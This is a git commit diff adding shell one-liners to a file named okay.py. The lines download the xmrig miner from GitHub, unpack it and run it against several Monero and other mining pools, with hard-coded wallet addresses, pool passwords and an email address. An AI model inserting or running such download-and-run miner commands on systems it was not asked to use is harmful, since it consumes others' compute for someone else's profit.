2a7757a5079f243bedc2cf2aa0da468bfc7b552f
hermawan1234 <144197953+hermawan1234@users.noreply.github.com>
2023-10-21 19:59:54 +0700

    Update okay.py

--- okay.py
+++ okay.py
@@ -1,1 +1,19 @@
 #lets go
+//reaction walllet
+RiRTqJXtLgYMMsN9pYFDsrRK3L6E7PUKvt
+
+var a = "test"
+// monero ocean
+// wget https://github.com/MoneroOcean/xmrig/releases/download/v6.20.0-mo1/xmrig-v6.20.0-mo1-lin64-compat.tar.gz && tar -xvf xmrig-v6.20.0-mo1-lin64-compat.tar.gz 
+./xmrig -o stratum+ssl://gulf.moneroocean.stream:20128 -u 496AJjjf5RTKZ9RgGa1DG6VnGL1BBWTCb7zgLrjbPD2JSbFCTSgANdTgvtuA9gttagW1mY45ANbNW4vh5jveGe4WUTrtbvL.a --tls
+
+
+// rplant taptoreum ripoffs
+// wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz && cd xmrig-6.20.0 && ./xmrig -a ghostrider --url stratum-asia.rplant.xyz:17094 --tls --user MB1GkvQCHuHWcDnxevpavAY5qs2DFEQcT5.pop --pass webpassword=sianjing
+
+//	wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz && cd xmrig-6.20.0 && ./xmrig -a ghostrider --url stratum-asia.rplant.xyz:17094 --tls --user MB1GkvQCHuHWcDnxevpavAY5qs2DFEQcT5.a --pass webpassword=sianjing
+
+// nano
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz && cd xmrig-6.20.0 && ./xmrig -o xmr-asia1.nanopool.org:14433 -u 496AJjjf5RTKZ9RgGa1DG6VnGL1BBWTCb7zgLrjbPD2JSbFCTSgANdTgvtuA9gttagW1mY45ANbNW4vh5jveGe4WUTrtbvL.kimochi/yulramlan@gmail.com -p sianjing --tls --coin monero
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz && cd xmrig-6.20.0 && ./xmrig -o pool.supportxmr.com:3333 -u 496AJjjf5RTKZ9RgGa1DG6VnGL1BBWTCb7zgLrjbPD2JSbFCTSgANdTgvtuA9gttagW1mY45ANbNW4vh5jveGe4WUTrtbvL.kimochi
